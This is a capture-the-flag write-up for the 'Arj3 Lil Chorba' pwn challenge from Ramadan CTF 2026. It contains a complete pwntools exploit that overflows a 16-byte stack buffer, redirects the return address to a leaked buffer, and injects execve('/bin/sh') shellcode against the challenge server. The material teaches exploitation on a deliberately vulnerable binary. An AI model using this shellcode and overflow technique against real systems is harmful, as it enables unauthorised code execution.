---
title: "Ramadan CTF 2026 - Arj3 Lil Chorba"
date: 2026-03-16 06:00:00 +0100
categories: [ramadan_ctf_2026]
tags: [pwn, shellcode, bof, stack, writeup, Nerdicon, ramadan_ctf_2026, medium]
---

# [ Arj3 Lil Chorba ] Writeup

**Category:** Pwn (Buffer Overflow + Shellcode)  
**Difficulty:** Easy  
**Author:** Nerdicon  

![challenge](https://github.com/YahyaMouelhi/yahyamouelhi.github.io/blob/main/assets/images/ramadhan-ctf-26/Nerdicon/arj3_lil_chorba/arj3_lil_chorba.png?raw=true)

## Tools Used

- `ghidra` / `gdb` for analysis
- `python3 (pwntools)` for exploit scripting and shellcode assembly

---

## Overview

"Koul el brika, w arj3 lil chorba" -- "Eat the brika, then go back to the chorba." A beautiful Ramadan food reference turned into a shellcode injection challenge!

The program gives us two buffers on the stack, leaks their addresses, and lets us write to both. We overflow the small `brika` buffer to redirect execution into the large `chorba` buffer where we place our shellcode.

---

## Source Code Analysis

The source code is provided:

```c
void vuln() {
    char brika[16] = {0};
    char chorba[256] = {0};

    printf("Brika : %p\n", brika);
    printf("Chorba: %p\n", chorba);

    printf("Koul el brika: ");
    fread(brika, 32, 1, stdin);      // reads 32 bytes into 16-byte buffer!

    printf("W Arj3 lil Chorba: ");
    fread(chorba, 256, 1, stdin);    // fills chorba with our shellcode
}
```

## File and checksec

Let's run the usual commands to get an idea of the binary and it's protections  :

![Checksec and file](https://github.com/YahyaMouelhi/yahyamouelhi.github.io/blob/main/assets/images/ramadhan-ctf-26/Nerdicon/arj3_lil_chorba/arj3_lil_chorba_file_checksec.png?raw=true)

It should be very obvious what we need to do , we need to inject and somehow execute a shellcode because the binary have NX disabled , let's run the binary and analyse futhermore and see ...

![run binary](https://github.com/YahyaMouelhi/yahyamouelhi.github.io/blob/main/assets/images/ramadhan-ctf-26/Nerdicon/arj3_lil_chorba/arj3_lil_chorba_run.png?raw=true)

Key observations:

1. **Stack leak:** Both `brika` and `chorba` addresses are printed -- we know exactly where our buffers live.
2. **Overflow in brika:** `fread(brika, 32, 1, stdin)` reads 32 bytes into a 16-byte buffer. That's 16 bytes of overflow -- enough to overwrite the saved RBP and saved RIP.
3. **Shellcode buffer:** `chorba` is 256 bytes, read exactly with `fread`. This is where we'll put our shellcode.
4. **NX might be off** since we're injecting shellcode on the stack (the binary is compiled to allow executable stack).

> **Tip:** The stack layout has `brika` above `chorba` (higher address). The overflow from `brika` reaches the saved return address. When the function returns, it jumps to wherever we pointed it -- straight into `chorba`.

---

## Exploitation Plan

1. **Receive the leaked `chorba` address** from the program output.
2. **Overflow `brika`:** Send 24 bytes of padding (16 bytes buffer + 8 bytes saved RBP) + the `chorba` address. This overwrites the return address to point at our shellcode.
3. **Send shellcode into `chorba`:** A classic `execve("/bin/sh", NULL, NULL)` shellcode padded to 256 bytes.

### The Shellcode

We use pwntools' inline assembler for a clean `execve` syscall:

```asm
mov rax, 59                        ; syscall number for execve
mov rdi, 0x0068732f6e69622f        ; "/bin/sh\0" packed as integer
push rdi                           ; push string onto stack
mov rdi, rsp                       ; rdi = pointer to "/bin/sh"
mov rsi, 0                         ; argv = NULL
mov rdx, 0                         ; envp = NULL
syscall                            ; execve("/bin/sh", NULL, NULL)

mov rax, 60                        ; exit syscall (clean exit)
mov rdi, 69
syscall
```

> **Tip:** The string `/bin/sh\0` fits in 8 bytes: `0x0068732f6e69622f`. We push it onto the stack and use RSP as the pointer. This avoids needing a separate `.data` section reference.

---

## Solution

```python
from pwn import *

context.arch = "amd64"

#p = process("./main")
p = remote("tcp.espark.tn" , 1122)

# Receive leaked chorba address
p.recvuntil(b"Chorba: ")
chorba_addr = p.recvline()
log.info(f"{chorba_addr=}")
chorba_addr = int(chorba_addr, 16)

# Stage 1: Overflow brika -> redirect return to chorba
payload = b"A" * 24
payload += p64(chorba_addr)
log.info(len(payload))
p.send(payload)

# Stage 2: Send shellcode into chorba
p.send(asm("""
mov rax, 59
mov rdi, 0x0068732f6e69622f
push rdi
mov rdi, rsp
mov rsi, 0
mov rdx, 0
syscall

mov rax, 60
mov rdi, 69
syscall
""").ljust(256, b"\x90"))

p.interactive()
```

![flag](https://github.com/YahyaMouelhi/yahyamouelhi.github.io/blob/main/assets/images/ramadhan-ctf-26/Nerdicon/arj3_lil_chorba/arj3_lil_chorba_flag.png?raw=true)

---

## Key Takeaways

- **Stack leaks make shellcode injection trivial.** If the program tells you where a buffer lives, you know exactly where to redirect execution.
- **Shellcode on the stack** is possible when NX is disabled. Always check with `checksec` -- if the stack is executable, shellcode is the simplest attack.
- The `fread(buf, size, 1, stdin)` call reads exactly `size` bytes. Unlike `fgets`, it does not stop at newlines, making it convenient for binary payloads.
- **Padding shellcode** with NOP slides (`\x90`) ensures alignment doesn't matter -- execution will slide into the real instructions.

## Helpful Resources

- [Shellcoding 101](https://www.exploit-db.com/docs/english/13019-shell-code-for-beginners.pdf)
- [x64 Linux syscall table](https://x64.syscall.sh/)

Thanks for reading!
